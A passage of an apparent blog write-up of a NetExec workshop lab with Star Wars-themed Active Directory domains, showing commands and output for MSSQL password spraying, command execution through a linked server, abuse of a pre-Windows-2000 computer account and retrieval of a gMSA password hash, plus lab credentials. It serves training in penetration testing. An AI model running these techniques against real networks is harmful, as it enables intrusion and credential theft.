</span></span><span style="display:flex;"><span>LDAP        10.0.0.5        <span style="color:#ae81ff">389</span>    CORUSCANT        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:CORUSCANT<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:No TLS cert<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>LDAP        10.0.0.5        <span style="color:#ae81ff">389</span>    CORUSCANT        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\k</span>rennic:liu8Sith 
</span></span><span style="display:flex;"><span>BADSUCCE... 10.0.0.5        <span style="color:#ae81ff">389</span>    CORUSCANT        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No domain controller with operating system Windows Server <span style="color:#ae81ff">2025</span> found, attack not possible. Enumerate dMSA objects anyway.
</span></span><span style="display:flex;"><span>BADSUCCE... 10.0.0.5        <span style="color:#ae81ff">389</span>    CORUSCANT        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> results
</span></span><span style="display:flex;"><span>BADSUCCE... 10.0.0.5        <span style="color:#ae81ff">389</span>    CORUSCANT        vader <span style="color:#f92672">(</span>S-1-5-21-2236031427-1663051459-2826524466-1601<span style="color:#f92672">)</span>, OU<span style="color:#f92672">=</span>Domain Controllers,DC<span style="color:#f92672">=</span>empire,DC<span style="color:#f92672">=</span>local
</span></span></code></pre></div><p><code>vader</code> shows up as a dMSA object but there are no Windows Servers 2025 so we can&rsquo;t exploit this further.</p>
<h3 id="back-to-mssql-on-mustafar">Back to MSSQL on <code>MUSTAFAR</code></h3>
<p>Back to the users that we enumerated earlier with the <code>enum_logins</code> module, we can try some basic password spraying.</p>
<p>We can try username=password for the local user we saw earlier in the database:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql scope/sql.txt -u <span style="color:#e6db74">&#39;droideka&#39;</span> -p <span style="color:#e6db74">&#39;droideka&#39;</span> --local-auth                                                                                     
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.8        <span style="color:#ae81ff">1433</span>   DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span>                                                                                     
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>                                                                                      
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.8        <span style="color:#ae81ff">1433</span>   DANTOOINE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DANTOOINE<span style="color:#ae81ff">\d</span>roideka:droideka <span style="color:#f92672">(</span>Login failed <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;droideka&#39;</span>. Please try again with or without <span style="color:#e6db74">&#39;--local-auth&#39;</span><span style="color:#f92672">)</span>                                            
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MUSTAFAR<span style="color:#ae81ff">\d</span>roideka:droideka
</span></span></code></pre></div><p>It works!</p>
<h4 id="credentials----droideka">Credentials 🔑 - <code>droideka</code></h4>
<pre tabindex="0"><code>droideka:droideka
</code></pre><h4 id="enumerating-mssql-links">Enumerating MSSQL Links</h4>
<p>Once again we can enumerate links since this user may have different permissions:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql scope/sql.txt -u <span style="color:#e6db74">&#39;droideka&#39;</span> -p <span style="color:#e6db74">&#39;droideka&#39;</span> --local-auth -M enum_links
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.8        <span style="color:#ae81ff">1433</span>   DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MUSTAFAR<span style="color:#ae81ff">\d</span>roideka:droideka 
</span></span><span style="display:flex;"><span>ENUM_LINKS  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Linked servers found:
</span></span><span style="display:flex;"><span>ENUM_LINKS  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>   - DANTOOINE<span style="color:#ae81ff">\S</span>QLEXPRESS
</span></span><span style="display:flex;"><span>ENUM_LINKS  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>   - mustafar<span style="color:#ae81ff">\S</span>QLEXPRESS
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.8        <span style="color:#ae81ff">1433</span>   DANTOOINE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DANTOOINE<span style="color:#ae81ff">\d</span>roideka:droideka <span style="color:#f92672">(</span>Login failed <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;droideka&#39;</span>. Please try again with or without <span style="color:#e6db74">&#39;--local-auth&#39;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><h4 id="executing-commands-on-a-linked-mssql-server">Executing Commands on a Linked MSSQL Server</h4>
<p>We are able to execute commands on the remote server directly, perhaps someone already enabled <code>xp_cmdshell</code> with the <code>link_enable_cmdshell</code> module 😆!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql 10.0.0.6 -u <span style="color:#e6db74">&#39;droideka&#39;</span> -p <span style="color:#e6db74">&#39;droideka&#39;</span> --local-auth -M link_xpcmd -o <span style="color:#e6db74">&#39;LINKED_SERVER=DANTOOINE\SQLEXPRESS&#39;</span> CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whoami&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MUSTAFAR<span style="color:#ae81ff">\d</span>roideka:droideka 
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running command on DANTOOINE<span style="color:#ae81ff">\S</span>QLEXPRESS: whoami
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Executed command via linked server
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         nt service<span style="color:#ae81ff">\m</span>ssql$sqlexpress
</span></span></code></pre></div><p>We have the <code>SeImpersonatePrivilege</code> which would be the classic way of elevating privileges but I don&rsquo;t know of a way to do that with NetExec:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql 10.0.0.6 -u <span style="color:#e6db74">&#39;droideka&#39;</span> -p <span style="color:#e6db74">&#39;droideka&#39;</span> --local-auth -M link_xpcmd -o <span style="color:#e6db74">&#39;LINKED_SERVER=DANTOOINE\SQLEXPRESS&#39;</span> CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whoami /priv&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ignore OPSEC in configuration is set and OPSEC unsafe module loaded                                                                                                                                            
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>                                                                                      
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MUSTAFAR<span style="color:#ae81ff">\d</span>roideka:droideka                                                                                                                                 
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running command on DANTOOINE<span style="color:#ae81ff">\S</span>QLEXPRESS: whoami /priv                                                                                                      
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Executed command via linked server                                                                                                                         
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         PRIVILEGES INFORMATION                                                                                                                                         
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         ----------------------                                                                                                                                         
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         Privilege Name                Description                               State                                                                                  
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">=============================</span> <span style="color:#f92672">=========================================</span> <span style="color:#f92672">========</span>                                                                               
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                                                                               
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         SeIncreaseQuotaPrivilege      Adjust memory quotas <span style="color:#66d9ef">for</span> a process        Disabled                                                                               
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                                                                
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled                                                                                
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         SeImpersonatePrivilege        Impersonate a client after authentication Enabled                                                                                
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         SeCreateGlobalPrivilege       Create global objects                     Enabled                                                                                
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
</span></span></code></pre></div><p>We can instead start by reading the root directory (<code>C:/</code>) and discover a directory called <code>rebels_plan</code> containing a <code>plans.txt</code> file, let&rsquo;s check it&rsquo;s contents:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql 10.0.0.6 -u <span style="color:#e6db74">&#39;droideka&#39;</span> -p <span style="color:#e6db74">&#39;droideka&#39;</span> --local-auth -M link_xpcmd -o <span style="color:#e6db74">&#39;LINKED_SERVER=DANTOOINE\SQLEXPRESS&#39;</span> CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;powershell -c cat /rebels_plan/plans.txt&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MUSTAFAR<span style="color:#ae81ff">\d</span>roideka:droideka 
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running command on DANTOOINE<span style="color:#ae81ff">\S</span>QLEXPRESS: powershell -c cat /rebels_plan/plans.txt
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Executed command via linked server
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         Our next base is located in a place called <span style="color:#e6db74">&#34;endor&#34;</span>, this is a top secret information !
</span></span></code></pre></div><p><img src="_screenshots/Workshop-NetExec-rebel-plan.png" alt=""></p>
<p>If we remember from earlier every machine has the name of a planet we can suppose that <code>endor</code> is referencing another machine? More on this just after.</p>
<p>We can enumerate users in the other domain:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql 10.0.0.6 -u <span style="color:#e6db74">&#39;droideka&#39;</span> -p <span style="color:#e6db74">&#39;droideka&#39;</span> --local-auth -M link_xpcmd -o <span style="color:#e6db74">&#39;LINKED_SERVER=DANTOOINE\SQLEXPRESS&#39;</span> CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;powershell -c net users /domain&#39;</span>                                                                                                                            
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>                             
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MUSTAFAR<span style="color:#ae81ff">\d</span>roideka:droideka                                                          
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running command on DANTOOINE<span style="color:#ae81ff">\S</span>QLEXPRESS: powershell -c net users /domain
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Executed command via linked server                                                                   
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         The request will be processed at a domain controller <span style="color:#66d9ef">for</span> domain rebels.local.
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         User accounts <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">\\</span>jedha.rebels.local
</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------                          
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         administrator            baze                     biggs
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         bodhi                    cassian                  chirrut
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         ezra                     finn                     Guest
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         han                      hera                     jyn                    
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         krbtgt                   lando                    leia
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         luke                     maz                      mon                
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         obiwan                   poe                      rey
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         sabine                   wedge
</span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         The command completed successfully.
</span></span></code></pre></div><p>With the list of users I sprayed the passwords that we have as well as username=password but nothing 😔</p>
<p>I was pretty stuck at this point so asked Wilfried for a hint. He asked me if I saw that the machines had names of planets which I did. So <code>endor</code> could be another machine and asked me if I knew any common attacks on machines.</p>
<p>I immediately thought of pre2k accounts. We can try that!</p>
<h3 id="pre-created-computer-accounts---pre2k">Pre-Created Computer Accounts - Pre2k</h3>
<p>I recommend reading this <a href="https://trustedsec.com/blog/diving-into-pre-created-computer-accounts">article</a> by TrustedSec if you are unfamiliar with Pre-Created Computer Accounts.</p>

  <div class="admonition note">
    <div class="admonition-header">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M0 64C0 28.7 28.7 0 64 0L224 0l0 128c0 17.7 14.3 32 32 32l128 0 0 125.7-86.8 86.8c-10.3 10.3-17.5 23.1-21 37.2l-18.7 74.9c-2.3 9.2-1.8 18.8 1.3 27.5L64 512c-35.3 0-64-28.7-64-64L0 64zm384 64l-128 0L256 0 384 128zM549.8 235.7l14.4 14.4c15.6 15.6 15.6 40.9 0 56.6l-29.4 29.4-71-71 29.4-29.4c15.6-15.6 40.9-15.6 56.6 0zM311.9 417L441.1 287.8l71 71L382.9 487.9c-4.1 4.1-9.2 7-14.9 8.4l-60.1 15c-5.5 1.4-11.2-.2-15.2-4.2s-5.6-9.7-4.2-15.2l15-60.1c1.4-5.6 4.3-10.8 8.4-14.9z"/></svg>
      <span>Tldr</span>
    </div>
      <div class="admonition-content">
        <p>When the &ldquo;<strong>Assign this computer account as a pre-Windows 2000 computer</strong>&rdquo; checkbox is selected when creating a computer object it sets the machine&rsquo;s password to the name of the machine in lowercase without the trailing <code>$</code> character.</p>
<p>For example if we create a machine account <code>FS01$</code> with the checkbox ticked the password would be set to <code>fs01</code>.</p>
      </div>
  </div>
<p>As you can see by the timestamp of the next command this is 45 minutes later, I lost a lot of time on this next stupid mistake 😆!</p>
<p>We can check if this account works by specifying the name of the machine account as the username and the password being the name of the machine account in lowercase without the trailing <code>$</code> like so:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ldap 10.0.0.7 -u ENDOR$ -p endor -d rebels.local
</span></span></code></pre></div><p>But it fails&hellip; I was confused at this point because I was used to seeing the <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> error message but that message only shows if the account has not been used yet and since I was running late someone must have beat me to it (or the account already logged in when the lab was setup).</p>

  <div class="admonition warning">
    <div class="admonition-header">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M256 32c14.2 0 27.3 7.5 34.5 19.8l216 368c7.3 12.4 7.3 27.7 .2 40.1S486.3 480 472 480L40 480c-14.3 0-27.6-7.7-34.7-20.1s-7-27.8 .2-40.1l216-368C228.7 39.5 241.8 32 256 32zm0 128c-13.3 0-24 10.7-24 24l0 112c0 13.3 10.7 24 24 24s24-10.7 24-24l0-112c0-13.3-10.7-24-24-24zm32 224a32 32 0 1 0 -64 0 32 32 0 1 0 64 0z"/></svg>
      <span>Warning</span>
    </div>
      <div class="admonition-content">
        <p>Remember to specify <code>-k</code> for Kerberos authentication (<a href="https://x.com/filip_dragovic/status/1524730451826511872">https://x.com/filip_dragovic/status/1524730451826511872</a>) ! Thanks to Wilfried again for the hint 😉!</p>
      </div>
  </div>
<p><img src="_screenshots/Workshop-NetExec-pre2k-with-Kerberos.png" alt=""></p>
<p>We now have an account in the <code>rebels.local</code> domain:</p>
<h3 id="credentials----endor">Credentials 🔑 - <code>endor</code></h3>
<pre tabindex="0"><code>endor$:endor
</code></pre><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<hr>
<h2 id="domain-2---rebelslocal">Domain 2 - <code>rebels.local</code></h2>
<p>Now that we have an account in this domain we can run the BloodHound ingestor again:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ldap 10.0.0.7 -u ENDOR$ -p endor -d rebels.local -k --dns-server 10.0.0.7 --bloodhound -c all                                                                                  
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:JEDHA<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:Never<span style="color:#f92672">)</span>                                                             
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\E</span>NDOR$:endor                                                                                                                                  
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            Resolved collection methods: localadmin, psremote, container, objectprops, group, rdp, dcom, session, acl, trusts                                              
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            Using kerberos auth without ccache, getting TGT                                                                                                                
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            Done in 0M 3S                                                                                                                                                  
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            Compressing output into /root/.nxc/logs/JEDHA_10.0.0.7_2025-06-28_234649_bloodhound.zip
</span></span></code></pre></div><p>We can list the computers to see if there are any more pre2k accounts that are vulnerable, but nothing there&hellip;</p>
<h3 id="group-managed-service-account-gmsa">Group Managed Service Account (gMSA)</h3>
<p>There is an interesting computer name containing <code>gMSA</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ldap 10.0.0.7 -u ENDOR$ -p endor -d rebels.local -k --computers
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:JEDHA<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:Never<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\E</span>NDOR$:endor 
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Total records returned: <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            jedha$
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            dantooine$
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            endor$
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            gMSA-scarif$
</span></span></code></pre></div><p>Let&rsquo;s blindly try and retrieve it&rsquo;s NT hash with the <code>--gmsa</code> flag as <code>endor</code> since time is pressing ⌛:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ldap 10.0.0.7 -u ENDOR$ -p endor -d rebels.local -k --gmsa     
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:JEDHA<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:Never<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\E</span>NDOR$:endor 
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting GMSA Passwords
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            Account: gMSA-scarif$         NTLM: 889c32ef466ff6b367cf8adf7fce539b     PrincipalsAllowedToReadPassword: ENDOR$
</span></span></code></pre></div><p>Surprisingly it works, but if we check the BloodHound post workshop it makes sense since <code>endor</code> has the <code>ReadGMSAPassword</code> over <code>gMSA-scarif$</code> as shown below:</p>
<p><img src="_screenshots/Workshop-NetExec-BloodHound-ReadGMSAPassword.png" alt=""></p>
<h3 id="credentials----gmsa-scarif">Credentials 🔑 - <code>gMSA-scarif$</code></h3>
<pre tabindex="0"><code>gMSA-scarif$:889c32ef466ff6b367cf8adf7fce539b
</code></pre><h3 id="enumeration-as-gmsa-scarif">Enumeration as <code>gMSA-scarif$</code></h3>
<p>Time to start our enumeration again with this account:</p>
<ul>
